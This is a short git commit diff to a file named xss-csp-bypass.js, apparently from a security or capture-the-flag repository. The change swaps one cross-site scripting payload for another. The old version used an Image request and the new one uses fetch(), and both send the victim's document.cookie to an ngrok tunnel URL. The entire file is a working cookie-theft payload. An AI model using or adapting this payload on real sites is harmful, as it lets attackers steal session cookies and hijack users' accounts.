bef3be2671cf8d59741a5a3ee185080d73a1925e
Dom0nS <74207547+Dom0nS@users.noreply.github.com>
2022-10-27 15:06:52 +0200

    Update xss-csp-bypass.js

--- xss-csp-bypass.js
+++ xss-csp-bypass.js
@@ -1,1 +1,3 @@
-new Image().src="https://ea5e-31-0-78-3.eu.ngrok.io?output="+document.cookie;
+fetch("https://ea5e-31-0-78-3.eu.ngrok.io?output="+document.cookie).then((res) => {
+	return res.text();
+})
